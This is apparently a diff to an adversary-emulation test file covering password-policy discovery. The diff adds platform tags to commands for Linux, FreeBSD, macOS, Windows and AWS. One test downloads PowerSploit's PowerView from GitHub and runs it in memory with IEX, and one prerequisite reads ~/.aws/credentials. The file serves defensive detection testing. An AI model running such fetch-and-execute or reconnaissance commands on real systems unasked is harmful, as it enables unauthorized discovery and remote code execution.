@@ -11,6 +11,8 @@ atomic_tests:
     command: |
       cat /etc/pam.d/common-password
     name: bash
+  run_on:
+  - linux
 - name: Examine password complexity policy - FreeBSD
   auto_generated_guid: a7893624-a3d7-4aed-9676-80498f31820f
   description: |
@@ -21,6 +23,8 @@ atomic_tests:
     command: |
       cat /etc/pam.d/passwd
     name: sh
+  run_on:
+  - freebsd
 - name: Examine password complexity policy - CentOS/RHEL 7.x
   auto_generated_guid: 78a12e65-efff-4617-bc01-88f17d71315d
   description: |
@@ -38,6 +42,8 @@ atomic_tests:
     command: |
       cat /etc/security/pwquality.conf
     name: bash
+  run_on:
+  - linux
 - name: Examine password complexity policy - CentOS/RHEL 6.x
   auto_generated_guid: 6ce12552-0adb-4f56-89ff-95ce268f6358
   description: |
@@ -56,6 +62,8 @@ atomic_tests:
       cat /etc/pam.d/system-auth
       cat /etc/security/pwquality.conf
     name: bash
+  run_on:
+  - linux
 - name: Examine password expiration policy - All Linux
   auto_generated_guid: 7c86c55c-70fa-4a05-83c9-3aa19b145d1a
   description: |
@@ -66,6 +74,8 @@ atomic_tests:
     command: |
       cat /etc/login.defs
     name: bash
+  run_on:
+  - linux
 - name: Examine local password policy - Windows
   auto_generated_guid: 4588d243-f24e-4549-b2e3-e627acc089f6
   description: |
@@ -76,6 +86,8 @@ atomic_tests:
     command: |
       net accounts
     name: command_prompt
+  run_on:
+  - windows
 - name: Examine domain password policy - Windows
   auto_generated_guid: 46c2c362-2679-4ef5-aec9-0e958e135be4
   description: |
@@ -86,6 +98,8 @@ atomic_tests:
     command: |
       net accounts /domain
     name: command_prompt
+  run_on:
+  - windows
 - name: Examine password policy - macOS
   auto_generated_guid: 4b7fa042-9482-45e1-b348-4b756b2a0742
   description: |
@@ -95,6 +109,8 @@ atomic_tests:
   executor:
     command: pwpolicy getaccountpolicies
     name: bash
+  run_on:
+  - macos
 - name: Get-DomainPolicy with PowerView
   auto_generated_guid: 3177f4da-3d4b-4592-8bdc-aa23d0b2e843
   description: |
@@ -106,6 +122,8 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
     name: powershell
+  run_on:
+  - windows
 - name: Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy
   auto_generated_guid: b2698b33-984c-4a1c-93bb-e4ba72a0babb
   description: |
@@ -119,7 +137,10 @@ atomic_tests:
     elevation_required: false
     command: |
       get-addefaultdomainpasswordpolicy
-- name: 'Use of SecEdit.exe to export the local security policy (including the password policy)'
+  run_on:
+  - windows
+- name: Use of SecEdit.exe to export the local security policy (including the password
+    policy)
   auto_generated_guid: 510cc97f-56ac-4cd3-a198-d3218c23d889
   description: |
     SecEdit.exe can be used to export the current local security policy applied to a host.
@@ -131,6 +152,8 @@ atomic_tests:
       secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Examine AWS Password Policy
   auto_generated_guid: 15330820-d405-450b-bd08-16b5be5be9f4
   description: |
@@ -138,14 +161,16 @@ atomic_tests:
   supported_platforms:
   - iaas:aws
   dependencies:
-    - description: |
-        Check if ~/.aws/credentials file has a default stanza is configured
-      prereq_command: |
-        cat ~/.aws/credentials | grep "default"
-      get_prereq_command: |
-        echo Please install the aws-cli and configure your AWS defult profile using: aws configure
+  - description: |
+      Check if ~/.aws/credentials file has a default stanza is configured
+    prereq_command: |
+      cat ~/.aws/credentials | grep "default"
+    get_prereq_command: |
+      echo Please install the aws-cli and configure your AWS defult profile using: aws configure
   executor:
     command: |
-       aws iam get-account-password-policy
+      aws iam get-account-password-policy
     name: sh
     elevation_required: false
+  run_on:
+  - iaas:aws
